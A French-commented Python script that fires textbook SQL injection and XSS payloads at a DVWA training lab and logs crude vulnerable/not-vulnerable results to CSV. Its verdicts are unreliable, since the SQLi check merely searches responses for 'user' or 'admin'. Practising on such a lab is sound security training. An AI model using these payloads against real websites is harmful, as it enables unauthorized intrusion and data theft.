import requests
import csv
import argparse

def exploit_sql_injection(base_url):
    """Exploite les vulnérabilités d'injection SQL sur DVWA."""
    vuln_results = []
    try:
        # Exemple d'exploitation d'injection SQL sur le formulaire de login
        url = f"{base_url}/dvwa/vulnerabilities/sqli/"
        payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "' OR '1'='1' #", "admin' -- "]
        
        for payload in payloads:
            data = {
                'id': payload,
                'Submit': 'Submit'
            }
            response = requests.post(url, data=data)
            if 'user' in response.text or 'admin' in response.text:
                vuln_results.append(('SQL Injection', payload, 'Vulnérable'))
            else:
                vuln_results.append(('SQL Injection', payload, 'Non vulnérable'))
    except Exception as e:
        print(f"Erreur lors de l'exploitation de l'injection SQL : {e}")
    
    return vuln_results

def exploit_xss(base_url):
    """Exploite les vulnérabilités XSS sur DVWA."""
    vuln_results = []
    try:
        # Exemple d'exploitation XSS sur un formulaire de commentaire
        url = f"{base_url}/dvwa/vulnerabilities/xss_s/"
        payloads = ["<script>alert('XSS')</script>", "javascript:alert('XSS')", "'><img src=x onerror=alert('XSS')>"]
        
        for payload in payloads:
            data = {
                'name': 'test',
                'message': payload,
                'Submit': 'Submit'
            }
            response = requests.post(url, data=data)
            if payload in response.text:
                vuln_results.append(('XSS', payload, 'Vulnérable'))
            else:
                vuln_results.append(('XSS', payload, 'Non vulnérable'))
    except Exception as e:
        print(f"Erreur lors de l'exploitation XSS : {e}")
    
    return vuln_results

def save_to_csv(results, filename):
    """Sauvegarde les résultats dans un fichier CSV."""
    with open(filename, 'w', newline='') as file:
        writer = csv.writer(file)
        writer.writerow(['Type de Vulnérabilité', 'Payload', 'Résultat'])
        for row in results:
            writer.writerow(row)

def main():
    parser = argparse.ArgumentParser(description="Exploiter les vulnérabilités de DVWA")
    parser.add_argument('base_url', type=str, help="URL de base de l'application DVWA")
    parser.add_argument('output_csv', type=str, help="Nom du fichier CSV de sortie")
    
    args = parser.parse_args()
    
    base_url = args.base_url
    output_csv = args.output_csv
    
    all_results = []

    # Exploiter les vulnérabilités SQL
    sql_results = exploit_sql_injection(base_url)
    all_results.extend(sql_results)

    # Exploiter les vulnérabilités XSS
    xss_results = exploit_xss(base_url)
    all_results.extend(xss_results)
    
    # Sauvegarder les résultats dans un fichier CSV
    save_to_csv(all_results, output_csv)
    print(f"Les résultats ont été sauvegardés dans {output_csv}")

if __name__ == "__main__":
    main()
